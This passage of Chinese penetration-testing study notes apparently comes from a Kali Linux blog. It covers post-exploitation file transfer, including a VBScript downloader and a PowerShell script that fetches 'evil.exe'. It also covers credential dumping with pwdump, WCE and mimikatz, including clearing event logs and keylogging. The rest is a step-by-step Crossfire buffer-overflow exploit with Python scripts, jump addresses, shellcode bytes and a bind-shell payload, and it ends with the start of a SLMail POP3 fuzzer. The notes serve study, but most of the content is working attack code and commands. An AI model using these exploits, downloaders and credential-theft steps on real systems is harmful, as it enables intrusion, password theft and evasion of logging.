<li>目标IP硬编码</li>
</ul>
</li>
<li>646.c<ul>
<li>Windows环境下编译</li>
<li><strong><code>🔺命令：apt-get install mingw32 ▲ 2019.12.16 更改为apt-get install mingw-w64</code></strong></li>
<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong></li>
<li><strong><code>🔺命令：i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe</code></strong> ▲ 2019.12.16 更改为 i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32</li>
<li><strong><code>🔺命令：wine sl.exe IP地址</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>exploit脚本路径：/usr/share/exploitdb/exploits/windows/remote</code></pre></blockquote>
<ul>
<li>643.c<ul>
<li>Linux环境下编译</li>
<li><strong><code>🔺命令：gcc 643.c -o 643</code></strong></li>
<li>Shellcode，偏移量，IP地址需要被替换</li>
</ul>
</li>
</ul>
<h4 id="3-避免有害的EXP"><a href="#3-避免有害的EXP" class="headerlink" title="3. 避免有害的EXP"></a>3. 避免有害的EXP</h4><ul>
<li>不同的EXP<ul>
<li>不同的系统补丁</li>
<li>软件版本</li>
<li>不同的offset、Shellcode</li>
</ul>
</li>
<li>扫描探测目标系统版本，搭建适当的测试环境<ul>
<li>避免一锤子测试</li>
</ul>
</li>
<li>修改公开的EXP满足不同环境需要<ul>
<li>了解漏洞原理，修改溢出代码</li>
</ul>
</li>
</ul>
<h4 id="4-后漏洞利用阶段（POST-EXPLOITATION）"><a href="#4-后漏洞利用阶段（POST-EXPLOITATION）" class="headerlink" title="4. 后漏洞利用阶段（POST EXPLOITATION）"></a>4. 后漏洞利用阶段（POST EXPLOITATION）</h4><ul>
<li>上传工具（更好控制服务器）</li>
<li>提权</li>
<li>擦除攻击痕迹</li>
<li>安装后门（进行长期的控制）<ul>
<li>长期控制</li>
<li>Dump密码</li>
<li>内网渗透</li>
</ul>
</li>
<li>后漏洞利用阶段<ul>
<li>最大的挑战–防病毒软件（信息库进行匹配，软件会更新）</li>
<li>使用合法远程控制软件</li>
</ul>
</li>
</ul>
<h4 id="5-漏洞利用后阶段"><a href="#5-漏洞利用后阶段" class="headerlink" title="5. 漏洞利用后阶段"></a>5. 漏洞利用后阶段</h4><ul>
<li>上传文件<ul>
<li>持久控制</li>
<li>扩大对目标系统的控制能力</li>
</ul>
</li>
<li>Linux系统<ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
</li>
<li>Windows<ul>
<li>缺少预装的下载工具</li>
</ul>
</li>
</ul>
<h4 id="6-漏洞利用后阶段"><a href="#6-漏洞利用后阶段" class="headerlink" title="6. 漏洞利用后阶段"></a>6. 漏洞利用后阶段</h4><ul>
<li>非交互式shell<ul>
<li>类NC远程控制shell</li>
<li>ftp 192.168.1.1（无法进行交互）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>nc监听下来的shell与本机的shell存在不同
window xp安装ftp：appwiz.cpl → Add → IIS → FTP（可能需要安装光盘）</code></pre></blockquote>
<h4 id="7-使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）"><a href="#7-使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）" class="headerlink" title="7. 使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）"></a>7. 使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）</h4><ul>
<li>XP、2003默认安装</li>
<li>Win7、2008需要单独添加（作为操作系统组件单独添加）</li>
<li>经常被边界防火墙过滤</li>
<li>Kali<ul>
<li><strong><code>🔺命令：mkdir /tftp</code></strong></li>
<li><strong><code>🔺命令：chown -R nobody /tftp</code></strong>（作为服务程序的权限，较低）</li>
<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /tftp/</code></strong>（拷贝需要上传文件）</li>
<li><strong><code>🔺命令：atftpd --daemon --port 69 /tftp</code></strong>（作为后端程序）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>需要把tftpd下所有文件，组属设置为nobody，才能被下载</code></pre></blockquote>
<ul>
<li>Windows<ul>
<li><strong><code>🔺命令：tftp -i IP地址 get nc.exe</code></strong>  </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>tasklist查看Window运行的进程（exe）
klogger.exe记录键盘敲击的字符</code></pre></blockquote>
<h4 id="8-利用FTP传输文件"><a href="#8-利用FTP传输文件" class="headerlink" title="8. 利用FTP传输文件"></a>8. 利用FTP传输文件</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：apt-get install pure-ftpd</code></strong></li>
<li><strong><code>🔺命令：./ftp.sh</code></strong>（ftp配置文件）</li>
</ul>
</li>
</ul>
<pre><code>#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd yuanfh -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart</code></pre><ul>
<li>Windows<ul>
<li><strong><code>🔺命令：echo open IP地址 21&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo 用户&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo 密码&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo bin&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo GET whoami.exe&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo GET klogger.exe&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo bye&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：ftp -s:ftp.txt</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>需要拷贝要上传的文件到ftp server的根目录下</code></pre></blockquote>
<h4 id="9-使用VBSCRIPT传输文件"><a href="#9-使用VBSCRIPT传输文件" class="headerlink" title="9. 使用VBSCRIPT传输文件"></a>9. 使用VBSCRIPT传输文件</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
</ul>
</li>
<li>Windows<ul>
<li>wget.vbs ▲ 2019.12.17 XP系统报错：Microsoft VBScript runtime error下标越界</li>
</ul>
</li>
</ul>
<pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreatObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreatObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject(&quot;Scripting,FileSystemObject&quot;) &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True)&gt;&gt;wget.vbs
echo strData = &quot;&quot; &gt;&gt; wget.vbs
echo strBuffter = &quot;&quot; &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter+1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs </code></pre><ul>
<li>Windows  <ul>
<li><strong><code>🔺命令：cscript wget.vbs http://IP地址/whoami.exe w.exe</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-使用POWERSHELL传输文件"><a href="#10-使用POWERSHELL传输文件" class="headerlink" title="10. 使用POWERSHELL传输文件"></a>10. 使用POWERSHELL传输文件</h4><ul>
<li>Kali <ul>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
</ul>
</li>
<li>Windows<ul>
<li>Wget.ps1 ▲2019.12.17报错：webclient.DownloadFile($url,$file)请求期间发生异常</li>
</ul>
</li>
</ul>
<pre><code>$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = &quot;http://IP地址/evil.exe&quot;
$file = &quot;new-exploit.exe&quot;
$webclient.DownloadFile($url,$file)</code></pre><ul>
<li>Windows<ul>
<li><strong><code>🔺命令：powershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-使用DEBUG传输文件"><a href="#11-使用DEBUG传输文件" class="headerlink" title="11. 使用DEBUG传输文件"></a>11. 使用DEBUG传输文件</h4><ul>
<li>Debug（Windows3.1就有Debug这个命令）<ul>
<li>汇编、反汇编</li>
<li>16进制dump</li>
<li>默认限制文本文件64K字节</li>
</ul>
</li>
<li>upx压缩文件（对传输文件进行压缩，在Kali下压缩）</li>
<li><strong><code>🔺命令：wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt</code></strong></li>
<li><strong><code>🔺命令：debug&lt;123.hex</code></strong>  </li>
<li><strong><code>🔺命令：copy 1.dll nc.exe</code></strong></li>
</ul>
<h4 id="12-抓包嗅探（只能抓请求本地服务的身份验证）"><a href="#12-抓包嗅探（只能抓请求本地服务的身份验证）" class="headerlink" title="12. 抓包嗅探（只能抓请求本地服务的身份验证）"></a>12. 抓包嗅探（只能抓请求本地服务的身份验证）</h4><ul>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeek（图形化界面好，功能全）</li>
<li>commview</li>
<li>Sniffpass（只抓有密码的包，无论有无错密码，都会抓包）</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff（只抓密码的程序）</li>
</ul>
</li>
</ul>
<blockquote>
<p>   dsniff -h<br>   dsniff -i eth0</p>
</blockquote>
<h4 id="13-键盘记录"><a href="#13-键盘记录" class="headerlink" title="13. 键盘记录"></a>13. 键盘记录</h4><ul>
<li>Keylogger（记录所有的键盘敲击）</li>
<li>木马窃取（DarkComet-RAT）</li>
</ul>
<h4 id="14-本地缓存密码"><a href="#14-本地缓存密码" class="headerlink" title="14. 本地缓存密码"></a>14. 本地缓存密码</h4><ul>
<li>浏览器缓存的密码<ul>
<li>IE</li>
<li>Firefox</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Firefox：浏览器记住的密码：Preferences → Security → saved Logins → Show Passwords
IE：Internet选项 → 内容 → 自动完成设置 → 管理密码
Window7：运行 → appwiz.cpl → 控制面板 → 用户 → 凭据管理器</code></pre></blockquote>
<ul>
<li>网络密码</li>
<li>无线密码</li>
<li><a href="http://www.nirsoft.net（集成工具）" target="_blank" rel="noopener">http://www.nirsoft.net（集成工具）</a></li>
</ul>
<blockquote>
<pre><code>Remote Desktop PassView 远程桌面显示，对rdp文件进行读取</code></pre></blockquote>
<ul>
<li>Dump SAM<ul>
<li>Pwdump（可远程执行，需要IP，用户以及密码）</li>
<li>/usr/share/windows-binaries/fgdump</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>操作系统不保存密码，只保存密码的哈希值，输入登陆密码的时候，操作系统组件会对输入的密码进行哈希运算，比对密码数据库的哈希值
操作系统保存哈希值，有两个值，一个是LMHash，另一个是NTLMHash
本地密码数据库：C：\WINDOWS\system32\config\SAM</code></pre></blockquote>
<ul>
<li>Dump SAM<ul>
<li>PwDump.exe -h  </li>
<li>PwDump.exe  -x localhost ▲ 2019.12.18对于64bit的操作系统，需要加-x参数</li>
<li>保存搜到的文件上传Kali</li>
</ul>
</li>
<li>ophcrack<ul>
<li>load pwdump文件</li>
</ul>
</li>
</ul>
<h4 id="15-WINDOWS身份认证过程"><a href="#15-WINDOWS身份认证过程" class="headerlink" title="15. WINDOWS身份认证过程"></a>15. WINDOWS身份认证过程</h4><blockquote>
<pre><code>身份验证组件：
Windows NT Logon and Authentication Model
WINLOGON.EXE → LAS AUTH API(LSASRV.DLL) → MSV1_0.DDL(NTLM AUTH PKG)

身份验证方式：
Localhost:
明文cgarcia/密文pwd1 → h1=LMHash(&quot;pwd1&quot;)/h2=NTHash(&quot;pwd1&quot;) → cmp([h1,h2],SAM) → SAM DATABASE
Network:
1.The cleartxt password is not sent
2.The NTLM protocol is used

身份验证具体步骤：
发送方
1.cgarcia/pwd1
2.lmhash=LMHash(&quot;pwd1&quot;)/nthash=NTHash(&quot;pwd2&quot;)
3.Init connection
5.R=f(lmhash/nthash,C)
6.Sends cgarcia,R
接受方
4.Responds C=challenge random
7.R&#39;=f(SAM[lmhash/nthash],C)
8.R&#39;== R &gt;&gt;Access Grant/R&#39;&lt;&gt; R&gt;&gt;Access Denied(SAM Database)</code></pre></blockquote>
<h4 id="16-WCE（WINDOWS-CREDENTIAL-EDITOR）"><a href="#16-WCE（WINDOWS-CREDENTIAL-EDITOR）" class="headerlink" title="16. WCE（WINDOWS CREDENTIAL EDITOR）"></a>16. WCE（WINDOWS CREDENTIAL EDITOR）</h4><ul>
<li>/usr/share/windows-resources/wce（wce32.exe/wce64.exe/wce-universal.exe）</li>
<li>需要管理员权限</li>
<li><strong><code>🔺命令：wce-universal.exe -l</code></strong>（显示当前系统已经登陆的会话账号）</li>
<li><strong><code>🔺命令：wce-universal.exe -lv</code></strong>（显示当前登陆会话的详细信息）</li>
<li><strong><code>🔺命令：wce-universal.exe -d</code></strong> LUID（指定一个会话，然后删除）</li>
<li><strong><code>🔺命令：wce-universal.exe -e</code></strong>（指定刷新时间，登陆信息）</li>
<li><strong><code>🔺命令：wce-universal.exe -r</code></strong>（每隔5s重新刷新一次登陆信息）</li>
<li><strong><code>🔺命令：wce-universal.exe -g password</code></strong>（计算LMHash和NTLMHash）</li>
<li><strong><code>🔺命令：wce-universal.exe -w</code></strong>（从内存中读取Digest Authentication Package中存的明文密码）</li>
<li><strong><code>🔺命令：wce-universal.exe -i LUID -s 登陆信息</code></strong>（进行交互式修改）</li>
<li>LM/NT hash</li>
</ul>
<blockquote>
<pre><code>PWDUMP是从SAM Database中读取信息，WCE是从内存中读取信息</code></pre></blockquote>
<h4 id="17-WCE（WINDOWS-CREDENTIAL-EDITOR）"><a href="#17-WCE（WINDOWS-CREDENTIAL-EDITOR）" class="headerlink" title="17. WCE（WINDOWS CREDENTIAL EDITOR）"></a>17. WCE（WINDOWS CREDENTIAL EDITOR）</h4><ul>
<li>从内存中读取LM/NTLM hash</li>
<li>Digest Authentication Package</li>
<li>NTLM Security Package</li>
<li>Kerberos Security</li>
<li>防止WCE攻击</li>
<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Package<ul>
<li>kerberos</li>
<li>msv1_0</li>
<li>schannet</li>
<li>wdigest（本地连接身份验证，被删除后，只允许单用户登陆）▲2019.12.19能单用户登陆</li>
<li>tspka（远程连接身份验证）</li>
<li>pku2u</li>
</ul>
</li>
</ul>
<h4 id="18-其他工具"><a href="#18-其他工具" class="headerlink" title="18. 其他工具"></a>18. 其他工具</h4><ul>
<li><strong><code>🔺命令：pwdump locahost</code></strong></li>
<li><strong><code>🔺命令：fgdump</code></strong>（/usr/share/windows-binaries/fgdump）<ul>
<li>双击会生成3个文件（调用cachedump/pwdump）</li>
</ul>
</li>
<li><strong><code>🔺命令：mimikatz.exe</code></strong>（/usr/share/windows-resources/minikatz）<ul>
<li>::（同 -h）</li>
<li>privilege::debug（提权到debug权限）</li>
<li>sekurlsa::logonPasswords（查看当前已经在登陆状态的会话信息）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>sekurlsa
1.kerberos域环境的账号密码信息
2.wdigest本地环境的明文信息
3.logonPassword登陆的所有信息
4.minidump最小形式的dump
5.pth hash值的形式登陆账号</code></pre></blockquote>
<blockquote>
<pre><code>process
1.list列出当前进程表
2.start/stop开启/结束一个进程
3.suspend/resume挂起/冻结一个进程（杀毒软件）</code></pre></blockquote>
<blockquote>
<pre><code>lsadump
1.sam SAM数据库进行DUMP
2.cache cache读取
3.lsa las读取
4.hash 哈希值读取</code></pre></blockquote>
<blockquote>
<pre><code>ts（终端服务）
1.multirdp（打上补丁，允许多个用户进行登陆）</code></pre></blockquote>
<blockquote>
<pre><code>event
1.drop（不再产生新的日志，登陆行为不会为记录在日志）
2.clear（清楚操作系统安全性日志）
3.eventvwr操作系统日志查看</code></pre></blockquote>
<blockquote>
<pre><code>Misc
1.cmd（启动一个cmd）
2.regedit（启动注册表）
3.taskmgr（启动任务管理器）
4.wifi（查看连接所有wifi的所有密码）</code></pre></blockquote>
<blockquote>
<pre><code>token
1.whoami（whoami和sid）
2.list（详细列出账号信息，名称，权限，SID）</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十八)：Linux缓冲区溢出</title>
    <url>/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<hr>
<h4 id="1-FUZZING"><a href="#1-FUZZING" class="headerlink" title="1. FUZZING"></a>1. FUZZING</h4><ul>
<li>Crossfire ▲ 2019.12.13实例未找到<ul>
<li>多人在线RPG在线</li>
<li>1.9.0版本接受入站socket连接时存在缓冲区溢出漏洞</li>
</ul>
</li>
<li>调试工具<ul>
<li>edb</li>
</ul>
</li>
<li>运行平台<ul>
<li>Kali i386虚拟机</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>crossfile进行安装：（工作端口：13327）
mv crossfire.tar.gz /usr/games
cd /usr/games
tar zxpf crossfire.tar.gz
cd crossfire/bin
./crossfire（缺少组件可自行安装）</code></pre></blockquote>
<blockquote>
<pre><code>64位操作系统难以进行缓冲区溢出，32位操作系统较容易进行缓冲区溢出
调试工具：Kali Linux → Reverse Engnieering → Debuggers → edb-degugger</code></pre></blockquote>
<h4 id="2-FUZZING"><a href="#2-FUZZING" class="headerlink" title="2. FUZZING"></a>2. FUZZING</h4><ul>
<li>新版本Linux内核支持内存保护机制<ul>
<li>DEP</li>
<li>ASLR</li>
<li>堆栈cookies</li>
<li>堆栈粉碎</li>
</ul>
</li>
</ul>
<h4 id="3-FUZZING"><a href="#3-FUZZING" class="headerlink" title="3. FUZZING"></a>3. FUZZING</h4><ul>
<li>本机调试（测试时，最好限制只能本机访问，怕有公网访问扫描）<ul>
<li><strong><code>🔺命令：iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP</code></strong></li>
<li><strong><code>🔺命令：iptables -A INPUT -p tcp --destiantion-port 13327\! -d 127.0.0.1 -j DROP</code></strong></li>
</ul>
</li>
</ul>
<h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
<li>解压<ul>
<li>/usr/games</li>
<li><strong><code>🔺命令：tar zxpf crossfire.tar.gz</code></strong></li>
</ul>
</li>
<li>调试<ul>
<li><strong><code>🔺命令：edb --run /usr/games/crossfire/bin/crossfire</code></strong></li>
<li>在界面Debug下run两次，才能开启edb命令行 → waiting for connection</li>
<li><strong><code>🔺命令：./01.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket
host=&quot;127.0.0.1&quot;
crash=&#39;\x41&#39;*4379
buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print &quot;[*]Sending evil buffer...&quot;
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print &quot;[*]Payload Sent!&quot;</code></pre><blockquote>
<pre><code>crossfire只有在发生了固定大小的字节后，会发生缓冲区溢出，为4379位（4378，4380也可以发生缓冲区溢出，但无法精确修改EIP的参数）</code></pre></blockquote>
<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
<li>唯一字符串识别EIP精确位置<ul>
<li><strong><code>🔺命令：./usr/share/metasploit-framework/tools/pattern_create.rb 4379</code></strong></li>
<li><strong><code>🔺命令：./02.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket
host=&quot;127.0.0.1&quot;
crash=
buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print &quot;[*]Sending evil buffer...&quot;
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print &quot;[*]Payload Sent!&quot;</code></pre><ul>
<li>唯一字符串识别EIP精确位置<ul>
<li><strong><code>🔺命令：./usr/share/metasploit-framework/tools/pattern_offset.rb EIP寄存器位置</code></strong></li>
<li><strong><code>🔺命令：./03.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket
host=&quot;127.0.0.1&quot;
crash=&#39;A&#39;*4368+&#39;B&#39;*4+&#39;C&#39;*7
buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print &quot;[*]Sending evil buffer...&quot;
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print &quot;[*]Payload Sent!&quot;</code></pre><blockquote>
<pre><code>在此缓冲区溢出中，因为需要做到EIP缓冲区的精确溢出，所以长度固定为4379，意味着ESP的溢出长度只有7个字符，不适合做Shellcode的存放位置</code></pre></blockquote>
<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
<li>思路：</li>
<li>第一阶段Shellcode<ul>
<li>ESP跳转到EAX</li>
<li>偏移12个字节</li>
</ul>
</li>
<li>setup sound Shellcode2</li>
<li><strong><code>🔺命令：./usr/share/metasploit-framework/tools/nasm_shell.rb</code></strong><ul>
<li>add eax,12</li>
<li>jmp exa</li>
<li>\x83\xc0\x0c\xff\xe0\x90\x90（ESP必须是7个字符）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>EAX寄存器在不同时间，不同操作系统上的位置是变化的，只能通过系统固定模块去跳转，才能做到多台机器脚本的兼容性，参照windows缓冲区溢出的JMP ESP</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：./03.py</code></strong><pre><code>#!/usr/bin/python
import socket
host=&quot;127.0.0.1&quot;
crash=&#39;A&#39;*4368+&#39;B&#39;*4+&#39;\x83\xc0\x0c\xff\xe0\x90\x90&#39;
buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print &quot;[*]Sending evil buffer...&quot;
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print &quot;[*]Payload Sent!&quot;</code></pre></li>
</ul>
<blockquote>
<pre><code>使用插件：Plugins → OpcodeSearcher → Opcode Search → (EIP→ESP)</code></pre></blockquote>
<h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
<li>查找坏字符<ul>
<li>\x00\x0a\x0d\0x20</li>
</ul>
</li>
</ul>
<h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
<li>ESP跳转地址<ul>
<li>Opcode search</li>
<li>crash=’\x41’*4368+’\x97\x45\x13\x08’+’\x83\xc0\x0c\xff\xe0\x90\x90’</li>
</ul>
</li>
<li>设置断点（0x08134597）<ul>
<li>EIP–08134597</li>
<li>jmp esp</li>
<li>add eax,12</li>
<li>jmp eax</li>
</ul>
</li>
<li><strong><code>🔺命令：./04.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import socket
host=&quot;127.0.0.1&quot;
crash=&#39;\x41&#39;*4368+&#39;\x97\x45\x13\x08&#39;+&#39;\x83\xc0\x0c\xff\xe0\x90\x90&#39;
buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print &quot;[*]Sending evil buffer...&quot;
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print &quot;[*]Payload Sent!&quot;</code></pre><h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
<li>./msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | ./msfencode -b “\x00\x0a\x0d\0x20”</li>
<li><strong><code>🔺命令：./05.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import socket
host=&quot;127.0.0.1&quot;
shellcode=()
crash=shellcode+&#39;A&#39;*(4368-105)+&#39;\x97\x45\x13\x08&#39;+&#39;\x83\xc0\x0c\xff\xe0\x90\x90&#39;
buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print &quot;[*]Sending evil buffer...&quot;
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print &quot;[*]Payload Sent!&quot;</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十七)：Window缓冲区溢出</title>
    <url>/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<hr>
<h4 id="1-FUZZER（window缓存区溢出）"><a href="#1-FUZZER（window缓存区溢出）" class="headerlink" title="1. FUZZER（window缓存区溢出）"></a>1. FUZZER（window缓存区溢出）</h4><ul>
<li>SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead）</li>
<li>ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0）</li>
<li>mona.py（Github上下载）</li>
</ul>
<blockquote>
<pre><code>window上看开启的服务
1.netstat -nao（cmd）
2.services.msc（允许win+R）</code></pre></blockquote>
<blockquote>
<pre><code>mona.py放在ImmunityDebugger中
右键 → 查找目标 → PyCommonds → 拷贝mona.py</code></pre></blockquote>
<h4 id="2-FUZZER"><a href="#2-FUZZER" class="headerlink" title="2. FUZZER"></a>2. FUZZER</h4><ul>
<li>SLMail 5.50 Mail Server（不同端口开的不同服务，都有不同指令可以向服务器提交数据）<ul>
<li>POP3 PASS命令存在缓存区溢出漏洞（nc SMTP or POP3,shell code进行试探)</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行（CPU特性，通过操作系统软硬件实现，可绕过DEP）</li>
<li>ALSA：随机内存地址加载执行程序盒DDL，每次重启地址变化（动态内存地址分配，通过shell直接跳转到固定的内存地址，操作系统实现，在window vista之后加入）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>在Kali端，向右键服务器发送大量命令组合的字符串（如：USER;ls）
在window xp端，用ImmunityDebugger查看在发送命令时是否会出现缓冲区溢出</code></pre></blockquote>
<h4 id="3-POP3"><a href="#3-POP3" class="headerlink" title="3. POP3"></a>3. POP3</h4><ul>
<li>nc IP地址 110端口</li>
<li>了解未知协议<ul>
<li>Wireshark（抓包分析学习）</li>
<li>标准RFC（查询协议的参数，进行学习）</li>
</ul>
</li>
<li><strong><code>🔺命令：./01.py</code></strong>（测试是否能连接POP3服务器）</li>
</ul>
<pre><code>#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&#39;IP地址&#39;,110))
    data=s.recv(1024)
    print data

    s.send(&#39;USER yuanfh&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    print data

    s.send(&#39;PASS test\r\n&#39;)
    data=s.recv(1024)
    print data

    s.close()
    print &quot;\nDone!&quot;

except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
<li>测试PASS命令接收到大量数据是否会溢出（需要发送的数据大于缓冲区）</li>
<li>EIP寄存器存放下一条指令的地址（首先关注EIP，ESP，EDP，可使指向shell code的地址）</li>
<li><strong><code>🔺命令：./02.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import socket

buffer=[&#39;A&#39;]
counter=100
while len(buffer)&lt;=50:
    buffer.append(&quot;A&quot;*counter)
    counter=counter+200
for string in buffer:
